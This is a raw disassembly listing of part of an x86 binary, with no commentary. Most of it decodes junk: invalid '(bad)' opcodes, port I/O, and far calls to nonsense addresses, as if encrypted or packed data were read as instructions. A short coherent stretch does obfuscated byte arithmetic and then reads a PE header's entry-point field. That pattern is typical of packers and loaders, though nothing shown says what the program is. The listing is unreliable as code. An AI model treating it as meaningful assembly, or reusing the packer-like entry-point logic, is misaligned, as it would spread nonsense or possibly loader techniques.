  41a683:	mov    esi,0xb8064f49
  41a688:	sub    DWORD PTR [ebp+0x4ae58bba],ebx
  41a68e:	adc    eax,DWORD PTR [ecx]
  41a690:	and    eax,0x51025af0
  41a695:	xor    edx,ecx
  41a697:	fwait
  41a698:	ja     0x41a6ed
  41a69a:	sub    eax,DWORD PTR [eax-0x68886b1]
  41a6a0:	push   edi
  41a6a1:	cmp    al,bh
  41a6a3:	arpl   WORD PTR [edx+0x6f],cx
  41a6a6:	test   esi,edi
  41a6a8:	popf   
  41a6a9:	call   0x11db:0xf7505d55
  41a6b0:	out    dx,eax
  41a6b1:	adc    esi,DWORD PTR [eax+0x34]
  41a6b4:	das    
  41a6b5:	xchg   esi,eax
  41a6b6:	mov    ds:0xd3429fea,al
  41a6bb:	test   DWORD PTR [eax-0x5301c1ae],edi
  41a6c1:	adc    BYTE PTR [eax],0x47
  41a6c4:	test   BYTE PTR [ecx],ah
  41a6c6:	fistp  QWORD PTR [edi+0x553d8bad]
  41a6cc:	or     DWORD PTR [eax],edx
  41a6ce:	pop    ecx
  41a6cf:	mov    al,0x3c
  41a6d1:	dec    eax
  41a6d2:	jle    0x41a680
  41a6d4:	push   esp
  41a6d5:	add    ah,BYTE PTR [ebp+0x771c1c00]
  41a6db:	out    dx,al
  41a6dc:	test   al,0xe5
  41a6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6df:	(bad)  
  41a6e0:	or     DWORD PTR [edi-0x41846d84],esp
  41a6e6:	sbb    al,0x59
  41a6e8:	dec    esp
  41a6e9:	jae    0x41a6f7
  41a6eb:	pop    ebp
  41a6ec:	dec    eax
  41a6ed:	popa   
  41a6ee:	adc    BYTE PTR [ebp+0x70ad30a5],ch
  41a6f4:	sbb    BYTE PTR [edx+ebp*8],dl
  41a6f7:	push   0x2462c0b6
  41a6fc:	pop    es
  41a6fd:	ds icebp 
  41a6ff:	fimul  DWORD PTR [ecx+0x3b]
  41a702:	push   0x62
  41a704:	(bad)  
  41a705:	sbb    BYTE PTR [edx+0x6e],ah
  41a708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a709:	xor    eax,0x56fa28b6
  41a70e:	inc    ebx
  41a70f:	retf   0x75b0
  41a712:	mov    al,ds:0xbcdd5369
  41a717:	cld    
  41a718:	cld    
  41a719:	lock (bad) 
  41a71b:	push   ss
  41a71c:	ja     0x41a70a
  41a71e:	jns    0x41a6cd
  41a720:	int    0x7b
  41a722:	or     esi,ebp
  41a724:	dec    esi
  41a725:	scas   eax,DWORD PTR es:[edi]
  41a726:	add    DWORD PTR [edi+0x5722d840],ebp
  41a72c:	in     eax,0x35
  41a72e:	pusha  
  41a72f:	mov    ch,0xdc
  41a731:	es jecxz 0x41a6c5
  41a734:	loop   0x41a6ef
  41a736:	call   0x28d7c8fb
  41a73b:	enter  0x8896,0x9f
  41a73f:	jecxz  0x41a75a
  41a741:	outs   dx,DWORD PTR ds:[esi]
  41a742:	pop    ebx
  41a743:	jp     0x41a6c7
  41a745:	es jne 0x41a6f2
  41a748:	(bad)  
  41a749:	mov    ebx,0x91ddae24
  41a74e:	dec    esi
  41a74f:	shl    DWORD PTR [edi],1
  41a751:	or     BYTE PTR [edx-0x53dd8d2f],ch
  41a757:	jmp    0x832b:0x29cbba7d
  41a75e:	shl    BYTE PTR [esp+esi*2+0x1a],1
  41a762:	dec    DWORD PTR [esi]
  41a764:	(bad)  
  41a765:	pop    edi
  41a766:	call   0x36df4635
  41a76b:	aam    0x52
  41a76d:	ds push es
  41a76f:	adc    al,BYTE PTR [edi-0x44]
  41a772:	fs arpl cx,cx
  41a775:	jmp    0x41a78f
  41a777:	mov    fs,edi
  41a779:	mov    cl,0xa7
  41a77b:	mov    ch,dl
  41a77d:	xchg   edx,eax
  41a77e:	repz xchg ebx,eax
  41a780:	fild   QWORD PTR [ebp-0x5d]
  41a783:	jecxz  0x41a72a
  41a785:	les    ecx,FWORD PTR [edx]
  41a787:	xor    eax,0xc025b5cc
  41a78c:	dec    esp
  41a78d:	sub    eax,0xb37ee045
  41a792:	mov    bl,0x4a
  41a794:	dec    DWORD PTR [edi]
  41a796:	cmp    al,0x1
  41a798:	mov    esp,0x4023ef8
  41a79d:	and    DWORD PTR [ebp+0x2a5622ad],edi
  41a7a3:	loopne 0x41a7fe
  41a7a5:	cwde   
  41a7a6:	or     BYTE PTR [ecx-0x73c69100],bl
  41a7ac:	rcl    dh,1
  41a7ae:	icebp  
  41a7af:	jmp    0x41a7d7
  41a7b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7b2:	adc    BYTE PTR [edi-0x512da7b3],bl
  41a7b8:	(bad)  
  41a7b9:	out    dx,al
  41a7ba:	ror    BYTE PTR ds:[ebp-0x70],0x2b
  41a7bf:	aam    0x2b
  41a7c1:	or     edi,DWORD PTR [ebp-0x20]
  41a7c4:	jb     0x41a77d
  41a7c6:	mov    bl,BYTE PTR ds:0x22c84c56
  41a7cc:	mov    ds:0x819fdc27,al
  41a7d1:	adc    al,0x59
  41a7d3:	shl    BYTE PTR [esi+0x2f298c62],cl
  41a7d9:	pop    eax
  41a7da:	sbb    esp,0xce5f114
  41a7e0:	not    BYTE PTR [esi+0x9541f4d]
  41a7e6:	enter  0xd8ce,0xeb
  41a7ea:	adc    DWORD PTR [ebx+0x4a02826b],esp
  41a7f0:	div    edi
  41a7f2:	js     0x41a788
  41a7f4:	cmp    ebx,DWORD PTR [ebx]
  41a7f6:	sahf   
  41a7f7:	mov    cl,0xc4
  41a7f9:	push   ebp
  41a7fa:	outs   dx,BYTE PTR ds:[esi]
  41a7fb:	cld    
  41a7fc:	addr16 cdq 
  41a7fe:	pop    ebp
  41a7ff:	mov    ah,0x1
  41a801:	call   ecx
  41a803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a804:	sti    
  41a805:	adc    esp,DWORD PTR [esp+ebx*8+0x79]
  41a809:	or     edi,DWORD PTR [esi-0x26]
  41a80c:	in     al,0xd
  41a80e:	leave  
  41a80f:	iret   
  41a810:	jae    0x41a820
  41a812:	sub    bl,al
  41a814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a815:	sar    DWORD PTR [edi-0x4],cl
  41a818:	aad    0xbb
  41a81a:	fstp   TBYTE PTR [esp+eax*4-0x7f28cd2]
  41a821:	xor    eax,0x62e629a4
  41a826:	aad    0x43
  41a828:	mov    ecx,0x6682d50c
  41a82d:	popa   
  41a82e:	dec    esp
  41a82f:	sahf   
  41a830:	jno    0x41a88e
  41a832:	pop    edx
  41a833:	mov    edi,0xa6eb67e1
  41a838:	out    0x2d,eax
  41a83a:	shl    BYTE PTR ds:0xc9613e2b,1
  41a840:	or     ah,cl
  41a842:	add    eax,0xa052efd
  41a847:	sar    dl,1
  41a849:	repnz outs dx,BYTE PTR ds:[esi]
  41a84b:	stc    
  41a84c:	mov    ecx,DWORD PTR [edx]
  41a84e:	outs   dx,DWORD PTR ds:[esi]
  41a84f:	inc    edx
  41a850:	jp     0x41a846
  41a852:	and    eax,0xa0b432e6
  41a857:	in     al,0xaa
  41a859:	retf   
  41a85a:	sti    
  41a85b:	xor    DWORD PTR [edx+0x6b],esp
  41a85e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a85f:	dec    ecx
  41a860:	mov    gs:0x2af0b570,eax
  41a866:	inc    eax
  41a867:	push   esi
  41a868:	jmp    0x41a821
  41a86a:	adc    al,0x8d
  41a86c:	loope  0x41a8d2
  41a86e:	mov    BYTE PTR [esp+0x3c],0x6d
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x4226b8
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0xddd15a28
  41a9ae:	mov    ds:0x29f3cf7e,eax
  41a9b3:	sar    BYTE PTR [esi-0x41413dcb],0x96
  41a9ba:	pop    edi
  41a9bb:	retf   
  41a9bc:	shl    edi,0x99
  41a9bf:	xchg   DWORD PTR [edx-0x73],ebx
  41a9c2:	sbb    ecx,DWORD PTR [ecx-0x1166cbbd]
  41a9c8:	fwait
  41a9c9:	out    0xab,al
  41a9cb:	nop
  41a9cc:	outs   dx,DWORD PTR ds:[esi]
  41a9cd:	cdq    
  41a9ce:	or     eax,DWORD PTR [ebp-0xf]
  41a9d1:	data16 and al,0xb6
  41a9d4:	pop    ebx
  41a9d5:	add    eax,edi
  41a9d7:	pop    ebx
  41a9d8:	loopne 0x41a9e1
  41a9da:	xchg   DWORD PTR [edi-0x22371022],ebx
  41a9e0:	fsub   DWORD PTR [edi]
  41a9e2:	cmp    edi,ebp
  41a9e4:	add    edi,DWORD PTR [eax]
  41a9e6:	pop    esi
  41a9e7:	fwait
  41a9e8:	cmp    eax,0x20c9319a
  41a9ed:	mov    ds:0x680c7af7,eax
  41a9f2:	push   ebx
  41a9f3:	out    dx,al
  41a9f4:	mov    ebp,0x2d7a7bb5
  41a9f9:	(bad)  
  41a9fb:	pop    ebx
  41a9fc:	add    BYTE PTR [edi-0x61],dh
  41a9ff:	sbb    esp,DWORD PTR [eax]
  41aa01:	adc    eax,0x27beaea4
  41aa06:	and    DWORD PTR [edi-0x3d71014a],esp
  41aa0c:	int3   
  41aa0d:	push   0x70
  41aa0f:	in     eax,0xe7
  41aa11:	ficom  WORD PTR [ebp-0x77]
  41aa14:	(bad)  
  41aa15:	scas   al,BYTE PTR es:[edi]
  41aa16:	mov    ebx,0x4079c1ac
  41aa1b:	in     eax,dx
  41aa1c:	outs   dx,BYTE PTR ds:[esi]
  41aa1d:	xchg   edi,eax
  41aa1e:	adc    al,0xe
  41aa20:	sub    BYTE PTR [edi+0x77601aca],al
  41aa26:	ja     0x41aa53
  41aa28:	xor    DWORD PTR [ebx],esi
  41aa2a:	adc    eax,0xaf82525
  41aa2f:	lahf   
  41aa30:	mov    bl,0xf2
  41aa32:	jecxz  0x41aaa5
  41aa34:	jge    0x41aaa0
  41aa36:	pop    edx
  41aa37:	call   0x10677d52
  41aa3c:	ds pop edx
  41aa3e:	sbb    al,0x1c
  41aa40:	mov    ebp,0x72569a14
  41aa45:	stos   BYTE PTR es:[edi],al
  41aa46:	outs   dx,BYTE PTR ds:[esi]
  41aa47:	sbb    bh,ah
  41aa49:	ret    0xfc27
  41aa4c:	mov    ebp,0x8169af4b
  41aa51:	dec    esp
  41aa52:	cmp    eax,0x317c4a1a
  41aa57:	arpl   WORD PTR [esi],bp
  41aa59:	and    ah,BYTE PTR [ebp-0x38]
  41aa5c:	adc    DWORD PTR [ecx+0x2c],0x22
  41aa60:	pop    esp
  41aa61:	ret    0xfe75
  41aa64:	dec    esi
  41aa65:	sbb    edi,DWORD PTR [edx]
  41aa67:	aas    
  41aa68:	adc    DWORD PTR [eax-0x14],edi
  41aa6b:	fs sub eax,0x28a0b9b0
  41aa71:	imul   edx,DWORD PTR [esi-0x62],0xffffffb2
  41aa75:	fst    QWORD PTR [ebp+0x7d3a1efc]
  41aa7b:	rol    edi,1
  41aa7d:	ror    BYTE PTR ds:0x4436030d,1
  41aa83:	or     DWORD PTR [esi-0x1b],eax
  41aa86:	mov    edi,0x661fbc1
  41aa8b:	cmp    eax,0x43dbfb07
  41aa90:	call   0xf1190e67
  41aa95:	retf   0x12ba
  41aa98:	mov    ?,WORD PTR [esp+esi*4+0x19f478dc]
  41aa9f:	xchg   esi,eax
  41aaa0:	ss leave 
  41aaa2:	push   ecx
  41aaa3:	adc    al,0x36
  41aaa5:	sbb    edi,DWORD PTR [esi+0x30]
  41aaa8:	jnp    0x41ab0e
  41aaaa:	retf   
  41aaab:	call   0x2f4b:0x2ffdc0fd
  41aab2:	imul   ecx,DWORD PTR [edx],0xffffffe6
  41aab5:	outs   dx,DWORD PTR ds:[esi]
  41aab6:	sub    bh,BYTE PTR [edi+0x57d966d]
  41aabc:	mov    ds:0x1d74366c,al
  41aac1:	enter  0x2e7c,0x9d
  41aac5:	jo     0x41aa53
  41aac7:	ds stos BYTE PTR es:[edi],al
  41aac9:	sar    BYTE PTR [esi+0x68],1
  41aacc:	(bad)  
  41aacd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aace:	sub    eax,0x530b518c
  41aad3:	stos   DWORD PTR es:[edi],eax
  41aad4:	in     al,0x9c
  41aad6:	xor    ecx,esi
  41aad8:	xor    DWORD PTR [ebx],ecx
  41aada:	(bad)  
  41aadb:	fstp   QWORD PTR [edx+0x198c6559]
  41aae1:	sahf   
  41aae2:	pop    edi
  41aae3:	push   0xf128c0bd
  41aae8:	gs stc 
  41aaea:	sbb    DWORD PTR [ebx-0x175c1ecf],0x3b54919e
  41aaf4:	test   DWORD PTR [ecx+edx*1+0x33],0xfc86652
  41aafc:	push   ebx
  41aafd:	dec    edi
  41aafe:	mov    bh,0xa5
  41ab00:	test   esp,esp
  41ab02:	mov    ecx,0xd31647ad
  41ab07:	push   ecx
  41ab08:	cld    
  41ab09:	sub    al,0xec
  41ab0b:	(bad)  
  41ab0c:	(bad)  
  41ab0d:	sbb    BYTE PTR [ebx-0x68],dl
  41ab10:	daa    
  41ab11:	call   0x4cec:0x40568017
  41ab18:	into   
  41ab19:	popf   
  41ab1a:	jl     0x41ab4c
  41ab1c:	mov    al,0xf6
  41ab1e:	aas    
  41ab1f:	call   0x5908:0x1f1c228a
  41ab26:	popa   
  41ab27:	bound  edi,QWORD PTR [edi-0x7354332]
  41ab2d:	aam    0x38
  41ab2f:	or     ecx,DWORD PTR [esi+0x2a]
  41ab32:	test   BYTE PTR [ebp+0x283a5486],bh
  41ab38:	ret    0xde27
  41ab3b:	arpl   WORD PTR [eax],sp
  41ab3d:	sbb    DWORD PTR [ecx],esp
  41ab3f:	xor    al,0xe2
  41ab41:	xor    bl,dh
  41ab43:	neg    BYTE PTR [edi]
  41ab45:	loopne 0x41ab7e
  41ab47:	sti    
  41ab48:	ja     0x41ab89
  41ab4a:	xchg   ebp,eax
  41ab4b:	aad    0xcf
  41ab4d:	inc    ecx
  41ab4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4f:	dec    edi
  41ab50:	rol    DWORD PTR [eax-0x27],0x40
  41ab54:	fadd   DWORD PTR [ebx-0x4aacab0a]
  41ab5a:	out    dx,al
  41ab5b:	xor    ebx,edi
  41ab5d:	xchg   BYTE PTR [ebx+ebx*1-0x2a],bl
  41ab61:	iret   
  41ab62:	aam    0x6e
  41ab64:	xchg   DWORD PTR [ebx+0x8],esi
  41ab67:	cmp    eax,0xf2962a1b
  41ab6c:	sub    al,0x9b
  41ab6e:	add    eax,0x80ae126c
  41ab73:	push   ebp
  41ab74:	xchg   ecx,eax
  41ab75:	stc    
  41ab76:	fnstsw WORD PTR [ecx]
  41ab78:	add    BYTE PTR [esi-0x6b0b08f3],al
  41ab7e:	push   ss
  41ab7f:	pop    esp
  41ab80:	bound  ebx,QWORD PTR [edx]
  41ab82:	xor    ch,BYTE PTR [esi+0x7f]
  41ab85:	push   edx
  41ab86:	ror    BYTE PTR cs:[esi-0xab08b13],0x33
  41ab8e:	mov    DWORD PTR [edx-0x58],ecx
  41ab91:	mov    ebp,0xd71f49a8
  41ab96:	mov    dh,0xec
  41ab98:	add    eax,0x14d2831d
  41ab9d:	xchg   edx,eax
  41ab9e:	inc    ecx
  41ab9f:	in     eax,0x11
  41aba1:	dec    esp
  41aba2:	inc    ebx
  41aba4:	jnp    0x41abd6
  41aba6:	cld    
  41aba7:	es mov ah,0xe3
  41abaa:	dec    esp
  41abab:	xchg   BYTE PTR [ecx-0x22],bh
  41abae:	push   edx
  41abaf:	mov    bl,0x20
  41abb1:	outs   dx,DWORD PTR ds:[esi]
  41abb2:	leave  
  41abb3:	push   0x61590075
  41abb8:	push   edx
  41abb9:	loopne 0x41ab57
  41abbb:	pusha  
  41abbc:	sbb    BYTE PTR [esp+eax*2],0xb7
  41abc0:	(bad)  
  41abc1:	pusha  
  41abc2:	and    edx,edx
  41abc4:	mov    WORD PTR [ebx+0xa],ds
  41abc7:	or     BYTE PTR [edx+0x61245892],dl
  41abcd:	aas    
  41abce:	cmp    esi,DWORD PTR [esp+eax*4]
  41abd1:	not    BYTE PTR [ebx-0x68]
  41abd4:	mov    ebp,0x122adf12
  41abd9:	cmp    DWORD PTR [ebx-0x2a785ac4],eax
  41abdf:	inc    eax
  41abe0:	fdivr  QWORD PTR [eax+esi*8+0xe]
  41abe4:	push   edx
  41abe5:	in     al,0x17
  41abe7:	xor    bl,ch
  41abe9:	cld    
  41abea:	dec    esi
  41abeb:	pop    ds
  41abec:	jnp    0x41ab9f
  41abee:	int    0x82
  41abf0:	(bad)  
  41abf1:	xchg   ecx,eax
  41abf2:	into   
  41abf3:	aam    0x6a
  41abf5:	ins    DWORD PTR es:[edi],dx
  41abf6:	rcl    ebp,1
  41abf8:	add    al,0x25
  41abfa:	inc    esp
  41abfb:	ret    0xffff
  41abfe:	add    eax,DWORD PTR [esp+0x30]
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	xchg   ebp,eax
  41ac19:	jecxz  0x41abe6
  41ac1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac1c:	imul   ebp,DWORD PTR ds:0xc235bec0,0xffffffbe
  41ac23:	mov    esi,0x93ed62f7
  41ac28:	xor    al,BYTE PTR [esi]
  41ac2a:	jg     0x41ac45
  41ac2c:	inc    esi
  41ac2d:	and    eax,0xb8a7aa46
  41ac32:	das    
  41ac33:	call   DWORD PTR [esi-0x21c36e83]
  41ac39:	pop    esp
  41ac3a:	sbb    al,dh
  41ac3c:	adc    ecx,ecx
  41ac3e:	xor    al,0xdb
  41ac40:	or     eax,0x818b59dd
  41ac45:	pop    ebx
  41ac46:	jp     0x41abee
  41ac48:	out    0xfb,eax
  41ac4a:	ret    
  41ac4b:	lock push edx
  41ac4d:	inc    eax
  41ac4e:	adc    bl,BYTE PTR [ebx]
  41ac50:	(bad)  
  41ac51:	imul   bl
  41ac53:	xchg   esp,eax
  41ac54:	lods   al,BYTE PTR ds:[esi]
  41ac55:	loop   0x41ac30
  41ac57:	xor    esp,DWORD PTR [esi]
  41ac59:	jmp    0xb16c:0x870f1e9
  41ac60:	add    ecx,edx
  41ac62:	push   cs
  41ac63:	iret   
  41ac64:	push   ebp
  41ac65:	lea    edx,[esp+edx*4+0x5b8ba91c]
  41ac6c:	outs   dx,BYTE PTR ds:[esi]
  41ac6d:	xlat   BYTE PTR ds:[ebx]
  41ac6e:	sbb    al,0xe9
  41ac71:	sar    DWORD PTR [edx+esi*2-0x131e931f],0xba
  41ac79:	and    al,0x58
  41ac7b:	jmp    0x5854:0x7d388662
  41ac82:	sub    al,0x38
  41ac84:	cdq    
  41ac85:	jne    0x41acda
  41ac87:	lea    edx,[ecx+0x130b7073]
  41ac8d:	aaa    
  41ac8e:	pop    ecx
  41ac8f:	pop    ebp
  41ac90:	cmove  esi,DWORD PTR [edi+ebx*2-0x58]
  41ac95:	mov    ds:0x9662d49f,eax
  41ac9a:	sti    
  41ac9b:	daa    
  41ac9c:	pop    edi
  41ac9d:	and    eax,0x87fe1e51
  41aca2:	leave  
  41aca3:	(bad)  
  41aca5:	mov    ebx,0x70a6c3a8
  41acaa:	int3   
  41acab:	jo     0x41acbb
  41acad:	jns    0x41ad1d
  41acaf:	sar    BYTE PTR [eax],0x47
  41acb2:	mov    ah,BYTE PTR [ebx]
  41acb4:	and    eax,0x5bf17448
  41acb9:	aas    
  41acba:	jge    0x41acbc
  41acbc:	cld    
  41acbd:	mov    DWORD PTR [ebx+0x4bc4a119],edx
  41acc3:	dec    edi
  41acc4:	xor    dl,BYTE PTR [edx-0x26]
  41acc7:	outs   dx,DWORD PTR ds:[esi]
  41acc8:	imul   ebx,ecx,0x35
  41accb:	pushf  
  41accc:	(bad)  
  41accd:	cld    
  41acce:	std    
  41accf:	dec    ecx
  41acd0:	aad    0x31
  41acd2:	int3   
  41acd3:	jnp    0x41aca0
  41acd5:	xchg   ebp,eax
  41acd6:	add    edi,ebx
  41acd8:	loope  0x41aca6
  41acda:	(bad)  
  41acdb:	aam    0xad
  41acdd:	add    BYTE PTR ds:0x5d2cb95d,dh
  41ace3:	mov    cl,0x16
  41ace5:	mov    esi,0x9566d4b6
  41acea:	adc    BYTE PTR fs:[ebx-0x21],dl
  41acee:	or     cl,dl
  41acf0:	inc    edi
  41acf2:	cli    
  41acf3:	cs inc esi
  41acf5:	(bad)  
  41acf6:	jge    0x41ad06
  41acf8:	js     0x41ad2b
  41acfa:	xor    dh,ah
  41acfc:	mov    dh,0x7d
  41acfe:	inc    eax
  41acff:	mov    ch,0x35
  41ad01:	xchg   esi,eax
  41ad02:	jg     0x41acf5
  41ad04:	cmp    eax,0x85a56754
  41ad09:	popf   
  41ad0a:	dec    edx
  41ad0b:	scas   al,BYTE PTR es:[edi]
  41ad0c:	ret    
  41ad0d:	xchg   ebx,eax
  41ad0e:	ds adc eax,0x8d068633
  41ad14:	(bad)  
  41ad15:	test   al,0x84
  41ad17:	fwait
  41ad18:	cmc    
  41ad19:	xchg   esp,eax
  41ad1a:	mov    ebp,0xa5b7cd70
  41ad1f:	pop    eax
  41ad20:	mov    eax,0x3acd2c97
  41ad25:	push   edi
  41ad26:	dec    ecx
  41ad27:	adc    BYTE PTR [ecx+0x7a96e3e0],cl
  41ad2d:	outs   dx,DWORD PTR ds:[esi]
  41ad2e:	sahf   
  41ad2f:	add    DWORD PTR [ebx-0x7f],ecx
  41ad32:	xor    eax,0x274d10e
  41ad37:	scas   al,BYTE PTR es:[edi]
  41ad38:	sub    ebx,edx
  41ad3a:	mov    bh,0x82
  41ad3c:	jle    0x41acdb
  41ad3e:	lods   eax,DWORD PTR ds:[esi]
  41ad3f:	sub    eax,esi
  41ad41:	xchg   ebx,eax
  41ad42:	push   ebx
  41ad43:	out    dx,al
  41ad44:	ret    
  41ad45:	ja     0x41ad2d
  41ad47:	stc    
  41ad48:	out    0x2e,al
  41ad4a:	mov    edi,0x5b415fd1
  41ad4f:	jmp    0x41ad5d
  41ad51:	hlt    
  41ad52:	mov    edi,0xd047f5d2
  41ad57:	xchg   ebx,eax
  41ad58:	jecxz  0x41ad04
  41ad5a:	mov    edi,0xee5cf5ca
  41ad5f:	loop   0x41ad7e
  41ad61:	inc    ebp
  41ad62:	push   ebp
  41ad63:	setno  BYTE PTR [ebp-0x7d5dfd71]
  41ad6a:	aad    0xf8
  41ad6c:	inc    eax
  41ad6d:	dec    edi
  41ad6e:	test   eax,0xce6d954c
  41ad73:	scas   al,BYTE PTR es:[edi]
  41ad74:	push   ecx
  41ad75:	push   esi
  41ad76:	add    ebx,esi
  41ad78:	stos   BYTE PTR es:[edi],al
  41ad79:	in     eax,0x72
  41ad7b:	pop    eax
  41ad7c:	stos   DWORD PTR es:[edi],eax
  41ad7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad7e:	or     al,0xc3
  41ad80:	out    0xb,al
  41ad82:	mov    ah,0xe6
  41ad84:	lods   al,BYTE PTR ds:[esi]
  41ad85:	cdq    
  41ad86:	dec    ecx
  41ad87:	nop
  41ad88:	inc    ebx
  41ad89:	push   cs
  41ad8a:	pop    ebx
  41ad8b:	mov    eax,0xe34f1fee
  41ad90:	cs push esp
  41ad92:	sbb    al,0xd8
  41ad94:	mov    edx,0xde37229e
  41ad99:	out    dx,eax
  41ad9a:	aaa    
  41ad9b:	mov    ecx,0x484c9f2b
  41ada0:	bound  ecx,QWORD PTR [edx-0x3f]
  41ada3:	dec    edi
  41ada4:	popa   
  41ada5:	test   eax,0xcce764d3
  41adaa:	or     al,0x61
  41adac:	mov    DWORD PTR [ebx-0x3ba72c49],edi
  41adb2:	mov    ch,0x2d
  41adb4:	ds dec ecx
  41adb6:	dec    eax
  41adb7:	push   es
  41adb8:	or     DWORD PTR [ebx],ecx
  41adba:	imul   esp,edx,0x7969979f
  41adc0:	and    al,0x34
  41adc2:	xor    eax,0xdca017fa
  41adc7:	fcomip st,st(5)
  41adc9:	mov    edi,0x15948ec7
  41adce:	cmp    cl,BYTE PTR [esi-0x26c24c6d]
  41add4:	push   ss
  41add5:	cmp    eax,0x4d505811
  41adda:	dec    eax
  41addb:	add    al,0x68
  41addd:	xchg   edi,eax
  41adde:	sub    dh,BYTE PTR [ebp-0x7cf4825b]
  41ade4:	jnp    0x41ad9f
  41ade6:	mov    ch,0xe6
  41ade8:	mov    ?,WORD PTR [ebp+0x355a8d8e]
  41adee:	mov    ah,0x4d
  41adf0:	stos   DWORD PTR es:[edi],eax
  41adf1:	push   ds
  41adf2:	lahf   
  41adf3:	jo     0x41ae41
  41adf5:	fst    DWORD PTR [esi]
  41adf7:	outs   dx,DWORD PTR ds:[esi]
  41adf8:	add    BYTE PTR [esi],dl
  41adfa:	in     eax,0x93
  41adfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfd:	dec    ebx
  41adfe:	rcr    DWORD PTR [ecx+0x46],1
  41ae01:	sti    
  41ae02:	xchg   ebp,eax
  41ae03:	mov    esi,ecx
  41ae05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae06:	add    DWORD PTR [bp+di+0x1a86],ecx
  41ae0b:	inc    eax
  41ae0c:	(bad)  
  41ae0d:	mov    eax,0x8a0d4008
  41ae12:	mov    edi,0x3c1dafa7
  41ae17:	test   edx,0xc1dfc704
  41ae1d:	cmp    DWORD PTR [ebx],0xed9c11ec
  41ae23:	mov    al,0xc
  41ae25:	rcl    BYTE PTR [bx+si],1
  41ae28:	clc    
  41ae29:	mov    ebp,0x824df7a4
  41ae2e:	(bad)  
  41ae2f:	loopne 0x41ae42
  41ae31:	(bad)  
  41ae32:	cli    
  41ae33:	push   edx
  41ae34:	ins    DWORD PTR es:[edi],dx
  41ae35:	stos   BYTE PTR es:[edi],al
  41ae36:	or     al,0xc7
  41ae38:	int    0xa2
  41ae3a:	jp     0x41adf8
  41ae3c:	enter  0x236d,0xeb
  41ae40:	xchg   ebp,eax
